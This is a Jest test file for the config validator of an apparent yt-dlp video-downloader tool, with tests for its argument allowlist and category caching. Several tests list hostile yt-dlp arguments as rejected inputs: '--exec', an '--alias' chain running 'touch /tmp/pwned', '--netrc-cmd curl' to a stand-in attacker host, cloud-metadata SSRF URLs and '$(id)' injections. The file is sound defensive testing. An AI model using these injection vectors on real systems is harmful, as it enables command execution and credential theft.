import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { getVideosFolderPaths } from '../config';
import { at } from '../test-utils';
import {
  CATEGORY_CACHE_TTL_MS,
  DEFAULT_DOWNLOAD_OPTIONS,
  getFolderPathsForCategory,
  invalidateCategoryCache,
  listCategories,
  loadDownloadOptions,
  readFolderConfig,
  resolveCategory,
  resolveDownloadOptions,
  validateFolderConfig,
} from './folderConfig';

jest.mock('../config');

const mockedGetVideosFolderPaths = getVideosFolderPaths as jest.MockedFunction<typeof getVideosFolderPaths>;

describe('folderConfig', () => {
  describe('validateFolderConfig', () => {
    it('accepts an empty object and a full valid config', () => {
      expect(validateFolderConfig({})).toBeNull();
      expect(
        validateFolderConfig({
          channelUrl: 'https://www.youtube.com/@x',
          maxHeight: 1080,
          subLangs: ['en', 'pl', 'en.*', 'all', '-live_chat'],
          writeComments: false,
          somethingElse: 42,
        }),
      ).toBeNull();
    });

    it('rejects non-objects', () => {
      expect(validateFolderConfig(null)).toBe('config object is required');
      expect(validateFolderConfig('x')).toBe('config object is required');
      expect(validateFolderConfig([])).toBe('config object is required');
    });

    it('validates channelUrl', () => {
      expect(validateFolderConfig({ channelUrl: 42 })).toBe('channelUrl must be a string');
      expect(validateFolderConfig({ channelUrl: '' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/@x' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/@x/videos' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/channel/UCabc123' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/c/name' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/user/name' })).toBeNull();
      expect(validateFolderConfig({ channelUrl: 'http://169.254.169.254/latest/meta-data' })).toMatch(
        /YouTube channel URL/,
      );
      expect(validateFolderConfig({ channelUrl: 'file:///etc/passwd' })).toMatch(/YouTube channel URL/);
      expect(validateFolderConfig({ channelUrl: 'https://evil.com/@x' })).toMatch(/YouTube channel URL/);
      expect(validateFolderConfig({ channelUrl: '--help' })).toMatch(/YouTube channel URL/);
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/watch?v=abcdefghijk' })).toMatch(
        /YouTube channel URL/,
      );
      expect(validateFolderConfig({ channelUrl: 'https://www.youtube.com/playlist?list=PLx' })).toMatch(
        /YouTube channel URL/,
      );
    });

    it('validates maxHeight', () => {
      expect(validateFolderConfig({ maxHeight: '1080' })).toMatch(/maxHeight/);
      expect(validateFolderConfig({ maxHeight: 1080.5 })).toMatch(/maxHeight/);
      expect(validateFolderConfig({ maxHeight: 100 })).toMatch(/maxHeight/);
      expect(validateFolderConfig({ maxHeight: 9000 })).toMatch(/maxHeight/);
      expect(validateFolderConfig({ maxHeight: 720 })).toBeNull();
    });

    it('validates subLangs', () => {
      expect(validateFolderConfig({ subLangs: 'en' })).toMatch(/subLangs/);
      expect(validateFolderConfig({ subLangs: [''] })).toMatch(/invalid language code/);
      expect(validateFolderConfig({ subLangs: ['en pl'] })).toMatch(/invalid language code/);
      expect(validateFolderConfig({ subLangs: [1] })).toMatch(/invalid language code/);
      expect(validateFolderConfig({ subLangs: [] })).toBeNull();
    });

    it('validates writeComments', () => {
      expect(validateFolderConfig({ writeComments: 'yes' })).toBe('writeComments must be a boolean');
    });

    it('validates extraArgs', () => {
      expect(validateFolderConfig({ extraArgs: '--cookies' })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: [''] })).toMatch(/invalid argument/);
      expect(validateFolderConfig({ extraArgs: [42] })).toMatch(/invalid argument/);
      expect(validateFolderConfig({ extraArgs: ['--no-playlist'] })).toBeNull();
    });

    it('rejects everything outside the allowlist', () => {
      const rejected = [
        // execution and file access
        ['--exec', 'id'],
        ['--exec-before-download', 'id'],
        ['--config-locations', '/tmp/x'],
        ['--plugin-dirs', '/tmp/evil'],
        ['--downloader', '/tmp/evil'],
        ['--enable-file-urls'],
        ['--print-to-file', '%(id)s', '/tmp/../x.txt'],
        ['--batch-file', '/etc/passwd'],
        ['--load-info-json', '/tmp/x.info.json'],
        ['--use-postprocessor', 'Exec:/tmp/x'],
        ['--postprocessor-args', 'Exec:id'],
        ['--ppa', 'Exec:id'],
        ['--downloader-args', 'curl:--config /tmp/x'],
        ['--external-downloader-args', 'ffmpeg:-i /tmp/x'],
        ['--ffmpeg-location', '/tmp/evil'],
        // cookie jar, credentials and network pivots
        ['--cookies', '/tmp/c.txt'],
        ['--cookies-from-browser', 'chrome'],
        ['--load-cookies', '/tmp/c.txt'],
        ['--netrc'],
        ['--netrc-cmd', 'curl -s http://attacker'],
        ['--netrc-location', '/tmp/.netrc'],
        ['--username', 'u'],
        ['--password', 'p'],
        ['--video-password', 'p'],
        ['--proxy=http://attacker'],
        ['--proxy', 'http://attacker'],
        // flags the download pipeline owns
        ['-f', 'mp4'],
        ['--format=best'],
        ['-o', 'x.%(ext)s'],
        ['--paths', '/tmp/elsewhere'],
        ['--download-archive', 'other.txt'],
        ['--merge-output-format', 'mkv'],
      ];
      for (const extraArgs of rejected) {
        const error = validateFolderConfig({ extraArgs });
        expect({ extraArgs, error }).toEqual({ extraArgs, error: expect.stringMatching(/extraArgs/) });
      }
    });

    it('accepts the allowlisted flags with values', () => {
      const accepted = [
        ['--no-playlist'],
        ['--no-warnings'],
        ['--no-write-thumbnail'],
        ['--no-write-description'],
        ['--no-write-info-json'],
        ['--no-write-subs'],
        ['--no-write-auto-subs'],
        ['--no-write-comments'],
        ['--no-write-playlist-metafiles'],
        ['--sleep-requests', '1.5'],
        ['--sleep-interval', '3'],
        ['--min-sleep-interval', '2'],
        ['--max-sleep-interval', '10'],
        ['--limit-rate', '4.2M'],
        ['--limit-rate=1G'],
        ['--retries', '3'],
        ['--retries', 'infinite'],
        ['--match-filter', 'duration > 600 & !is_live'],
        ['--match-filters', 'view_count >= 1000'],
        // a realistic channel config: throttle the channel, skip the shorts
        ['--sleep-requests', '1', '--limit-rate', '2M', '--match-filter', 'duration > 120'],
      ];
      for (const extraArgs of accepted) {
        const error = validateFolderConfig({ extraArgs });
        expect({ extraArgs, error }).toEqual({ extraArgs, error: null });
      }
    });

    it('rejects the argument-injection vectors the old denylist let through', () => {
      // Reproduced against yt-dlp 2026.08.19: --alias defines `foo` as
      // `--exec`, and calling --foo runs the command.
      expect(
        validateFolderConfig({ extraArgs: ['--alias', 'foo', '--exec {0}', '--foo', 'touch /tmp/pwned'] }),
      ).toMatch(/extraArgs/);
      // Short flags cluster, so one entry can carry two options: -i plus -a
      // (batch file), and -o/-P write outside the folder.
      expect(validateFolderConfig({ extraArgs: ['-ia', '/tmp/urls.txt'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['-io', '/tmp/elsewhere'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['-iP', '/tmp/elsewhere'] })).toMatch(/extraArgs/);
      // A bare entry is a second URL for yt-dlp: SSRF with no dash in sight.
      expect(validateFolderConfig({ extraArgs: ['http://169.254.169.254/latest/meta-data/'] })).toMatch(/extraArgs/);
      // yt-dlp resolves any unambiguous prefix of a long option.
      expect(validateFolderConfig({ extraArgs: ['--prox', 'http://attacker'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['--exec-a', 'id'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['--user', 'u'] })).toMatch(/extraArgs/);
      // Near misses of allowlisted names are not allowlisted either.
      expect(validateFolderConfig({ extraArgs: ['--limit-rat', '1M'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['--match-filte', 'duration > 600'] })).toMatch(/extraArgs/);
      expect(validateFolderConfig({ extraArgs: ['--no-write-commen'] })).toMatch(/extraArgs/);
    });

    it('rejects allowlisted flags with a missing or malformed value', () => {
      expect(validateFolderConfig({ extraArgs: ['--limit-rate'] })).toMatch(/needs a value/);
      expect(validateFolderConfig({ extraArgs: ['--limit-rate', '--no-playlist'] })).toMatch(/needs a value/);
      expect(validateFolderConfig({ extraArgs: ['--limit-rate', '1M; touch /tmp/pwned'] })).toMatch(/invalid value/);
      expect(validateFolderConfig({ extraArgs: ['--retries', '-1'] })).toMatch(/needs a value|invalid value/);
      expect(validateFolderConfig({ extraArgs: ['--retries', '99999'] })).toMatch(/invalid value/);
      expect(validateFolderConfig({ extraArgs: ['--sleep-interval', '1e9'] })).toMatch(/invalid value/);
      expect(validateFolderConfig({ extraArgs: ['--match-filter', '$(id)'] })).toMatch(/invalid value/);
      // boolean flags take no value, glued or not
      expect(validateFolderConfig({ extraArgs: ['--no-playlist=1'] })).toMatch(/extraArgs/);
    });

    it('validates category', () => {
      expect(validateFolderConfig({ category: 'fpv' })).toBeNull();
      expect(validateFolderConfig({ category: 'Zdrowie i sport' })).toBeNull();
      expect(validateFolderConfig({ category: 42 })).toBe('category must be a string');
      expect(validateFolderConfig({ category: '  ' })).toMatch(/must not be empty/);
      expect(validateFolderConfig({ category: 'x'.repeat(65) })).toMatch(/at most 64/);
      expect(validateFolderConfig({ category: 'a\nb' })).toMatch(/single line/);
    });

    it('validates the folder kind', () => {
      expect(validateFolderConfig({ kind: 'channel' })).toBeNull();
      expect(validateFolderConfig({ kind: 'collection' })).toBeNull();
      expect(validateFolderConfig({ kind: 'playlist' })).toBe('kind must be "channel" or "collection"');
      expect(validateFolderConfig({ kind: true })).toBe('kind must be "channel" or "collection"');
    });

    it('validates the yt-dlp feature toggles', () => {
      expect(
        validateFolderConfig({
          impersonate: true,
          sponsorblockRemove: true,
          concurrentFragments: 4,
        }),
      ).toBeNull();
      expect(validateFolderConfig({ impersonate: 'yes' })).toBe('impersonate must be a boolean');
      expect(validateFolderConfig({ sponsorblockRemove: 1 })).toBe('sponsorblockRemove must be a boolean');
      expect(validateFolderConfig({ concurrentFragments: 0 })).toMatch(/between 1 and 16/);
      expect(validateFolderConfig({ concurrentFragments: 32 })).toMatch(/between 1 and 16/);
      expect(validateFolderConfig({ concurrentFragments: 2.5 })).toMatch(/between 1 and 16/);
      expect(validateFolderConfig({ concurrentFragments: '4' })).toMatch(/between 1 and 16/);
    });
  });

  describe('resolveDownloadOptions', () => {
    it('returns defaults for a missing config', () => {
      expect(resolveDownloadOptions(null)).toEqual(DEFAULT_DOWNLOAD_OPTIONS);
      expect(resolveDownloadOptions(undefined)).toEqual(DEFAULT_DOWNLOAD_OPTIONS);
      expect(resolveDownloadOptions({})).toEqual(DEFAULT_DOWNLOAD_OPTIONS);
    });

    it('does not share the default subLangs array', () => {
      const options = resolveDownloadOptions(null);
      options.subLangs.push('pl');
      expect(DEFAULT_DOWNLOAD_OPTIONS.subLangs).toEqual(['en']);
    });

    it('overrides defaults with config values', () => {
      expect(
        resolveDownloadOptions({
          channelUrl: 'x',
          maxHeight: 1080,
          subLangs: ['pl', 'en'],
          writeComments: false,
        }),
      ).toEqual({
        maxHeight: 1080,
        subLangs: ['pl', 'en'],
        writeComments: false,
        extraArgs: [],
        impersonate: false,
        concurrentFragments: 1,
        sponsorblockRemove: false,
      });
    });

    it('allows disabling subtitles with an empty array', () => {
      expect(resolveDownloadOptions({ subLangs: [] }).subLangs).toEqual([]);
    });

    it('passes harmless extra yt-dlp arguments through', () => {
      expect(resolveDownloadOptions({ extraArgs: ['--no-playlist', '--no-warnings'] })).toEqual({
        maxHeight: 2160,
        subLangs: ['en'],
        writeComments: true,
        extraArgs: ['--no-playlist', '--no-warnings'],
        impersonate: false,
        concurrentFragments: 1,
        sponsorblockRemove: false,
      });
    });

    it('applies impersonation, SponsorBlock and fragment concurrency from the config', () => {
      expect(
        resolveDownloadOptions({
          impersonate: true,
          sponsorblockRemove: true,
          concurrentFragments: 4,
        }),
      ).toEqual({
        maxHeight: 2160,
        subLangs: ['en'],
        writeComments: true,
        extraArgs: [],
        impersonate: true,
        concurrentFragments: 4,
        sponsorblockRemove: true,
      });

      // invalid values from a hand-edited file fall back to the defaults
      expect(
        resolveDownloadOptions({
          impersonate: 'yes' as unknown as boolean,
          concurrentFragments: 99,
        }),
      ).toEqual({
        maxHeight: 2160,
        subLangs: ['en'],
        writeComments: true,
        extraArgs: [],
        impersonate: false,
        concurrentFragments: 1,
        sponsorblockRemove: false,
      });
    });

    it('ignores invalid values from a hand-edited file', () => {
      expect(
        resolveDownloadOptions({
          maxHeight: 'big' as unknown as number,
          subLangs: ['en', '', 'bad lang', 42 as unknown as string],
          writeComments: 'no' as unknown as boolean,
          // entries outside the allowlist (here -f and --proxy) are dropped
          // together with their value
          extraArgs: ['', 42 as unknown as string, '-f', 'best', '--proxy', 'http://p'],
        }),
      ).toEqual({
        maxHeight: 2160,
        subLangs: ['en'],
        writeComments: true,
        extraArgs: [],
        impersonate: false,
        concurrentFragments: 1,
        sponsorblockRemove: false,
      });
    });

    it('drops entries outside the allowlist, their values included', () => {
      const withExtraArgs = (extraArgs: string[]): string[] | undefined =>
        resolveDownloadOptions({ extraArgs }).extraArgs;

      expect(withExtraArgs(['--exec', 'id', '--no-playlist'])).toEqual(['--no-playlist']);
      expect(withExtraArgs(['-ia', '/tmp/urls.txt', '--no-playlist'])).toEqual(['--no-playlist']);
      expect(withExtraArgs(['--alias', 'foo', '--exec {0}', '--foo', 'touch /tmp/pwned'])).toEqual([]);
      expect(withExtraArgs(['http://169.254.169.254/', '--match-filter', 'duration > 600'])).toEqual([
        '--match-filter',
        'duration > 600',
      ]);
      expect(withExtraArgs(['--prox', 'http://attacker', '--no-playlist'])).toEqual(['--no-playlist']);
      expect(withExtraArgs(['-psecret', '--no-playlist'])).toEqual(['--no-playlist']);
      expect(withExtraArgs(['-o/tmp/elsewhere/%(title)s.%(ext)s', '--no-warnings'])).toEqual(['--no-warnings']);
    });

    it('drops an allowlisted flag whose value is missing or malformed', () => {
      const withExtraArgs = (extraArgs: string[]): string[] | undefined =>
        resolveDownloadOptions({ extraArgs }).extraArgs;

      expect(withExtraArgs(['--limit-rate'])).toEqual([]);
      expect(withExtraArgs(['--limit-rate', 'nonsense value'])).toEqual([]);
      expect(withExtraArgs(['--match-filter', '$(id)', '--no-playlist'])).toEqual(['--no-playlist']);
      expect(withExtraArgs(['--limit-rate=4.2M', '--no-playlist'])).toEqual(['--limit-rate=4.2M', '--no-playlist']);
    });
  });

  describe('readFolderConfig / loadDownloadOptions', () => {
    let dir: string;
    let consoleErrorSpy: jest.SpyInstance;

    beforeEach(async () => {
      dir = await fs.mkdtemp(path.join(os.tmpdir(), 'folder-config-'));
      consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation(() => {
        /* silence expected error logs */
      });
    });

    afterEach(async () => {
      jest.restoreAllMocks();
      await fs.rm(dir, { recursive: true, force: true });
    });

    it('returns null when config.json is missing', async () => {
      expect(await readFolderConfig(dir)).toBeNull();
      expect(await loadDownloadOptions(dir)).toEqual(DEFAULT_DOWNLOAD_OPTIONS);
      expect(consoleErrorSpy).not.toHaveBeenCalled();
    });

    it('reads and resolves an existing config', async () => {
      await fs.writeFile(
        path.join(dir, 'config.json'),
        JSON.stringify({ channelUrl: 'https://yt/@a', maxHeight: 1080, subLangs: ['pl'] }),
        'utf-8',
      );

      expect(await readFolderConfig(dir)).toEqual({
        channelUrl: 'https://yt/@a',
        maxHeight: 1080,
        subLangs: ['pl'],
      });
      expect(await loadDownloadOptions(dir)).toEqual({
        maxHeight: 1080,
        subLangs: ['pl'],
        writeComments: true,
        extraArgs: [],
        impersonate: false,
        concurrentFragments: 1,
        sponsorblockRemove: false,
      });
    });

    it('returns null and logs for a corrupt or non-object file', async () => {
      await fs.writeFile(path.join(dir, 'config.json'), '{oops', 'utf-8');
      expect(await readFolderConfig(dir)).toBeNull();
      expect(consoleErrorSpy).toHaveBeenCalled();

      await fs.writeFile(path.join(dir, 'config.json'), '[1,2]', 'utf-8');
      expect(await readFolderConfig(dir)).toBeNull();
    });
  });

  describe('categories', () => {
    it('resolveCategory trims and treats a blank or missing value as absent', () => {
      expect(resolveCategory({ category: '  fpv  ' })).toBe('fpv');
      expect(resolveCategory({ category: '   ' })).toBeUndefined();
      expect(resolveCategory({ channelUrl: 'https://yt/@a' })).toBeUndefined();
      expect(resolveCategory(null)).toBeUndefined();
      expect(resolveCategory({ category: 42 as unknown as string })).toBeUndefined();
    });

    describe('across configured folders', () => {
      let folders: string[];

      const writeConfig = (dir: string, config: unknown) =>
        fs.writeFile(path.join(dir, 'config.json'), JSON.stringify(config), 'utf-8');

      beforeEach(async () => {
        invalidateCategoryCache();
        folders = await Promise.all([0, 1, 2, 3].map(() => fs.mkdtemp(path.join(os.tmpdir(), 'folder-category-'))));
        mockedGetVideosFolderPaths.mockReturnValue(folders);
        // Folder names deliberately say nothing about the category
        await writeConfig(at(folders, 0), { category: 'fpv' });
        await writeConfig(at(folders, 1), { category: 'psychology' });
        await writeConfig(at(folders, 2), { category: ' FPV ' });
        await writeConfig(at(folders, 3), { channelUrl: 'https://yt/@a' });
      });

      afterEach(async () => {
        jest.restoreAllMocks();
        await Promise.all(folders.map((dir) => fs.rm(dir, { recursive: true, force: true })));
      });

      it('lists distinct categories sorted, collapsing case variants', async () => {
        expect(await listCategories()).toEqual(['fpv', 'psychology']);
      });

      it('matches folders case-insensitively and ignores those without a category', async () => {
        expect(await getFolderPathsForCategory('FpV')).toEqual([at(folders, 0), at(folders, 2)]);
        expect(await getFolderPathsForCategory(' psychology ')).toEqual([at(folders, 1)]);
      });

      it('returns no folders for an unknown or blank category', async () => {
        expect(await getFolderPathsForCategory('lego')).toEqual([]);
        expect(await getFolderPathsForCategory('   ')).toEqual([]);
      });

      it('reads every config once per TTL window, in parallel', async () => {
        const readFile = jest.spyOn(fs, 'readFile');

        await listCategories();
        await getFolderPathsForCategory('fpv');
        await listCategories();

        // one read per folder for the whole burst, not one per call
        expect(readFile).toHaveBeenCalledTimes(folders.length);
      });

      it('picks up an edited config.json after the TTL or on invalidation', async () => {
        expect(await getFolderPathsForCategory('lego')).toEqual([]);
        await writeConfig(at(folders, 3), { category: 'lego' });

        // still cached
        expect(await getFolderPathsForCategory('lego')).toEqual([]);

        invalidateCategoryCache();
        expect(await getFolderPathsForCategory('lego')).toEqual([at(folders, 3)]);

        await writeConfig(at(folders, 3), { category: 'robotics' });
        const later = Date.now() + CATEGORY_CACHE_TTL_MS + 1;
        jest.spyOn(Date, 'now').mockReturnValue(later);
        expect(await getFolderPathsForCategory('robotics')).toEqual([at(folders, 3)]);
      });

      it('does not serve one folder set from the cache built for another', async () => {
        expect(await listCategories()).toEqual(['fpv', 'psychology']);

        mockedGetVideosFolderPaths.mockReturnValue([at(folders, 1)]);
        expect(await listCategories()).toEqual(['psychology']);
      });
    });
  });
});
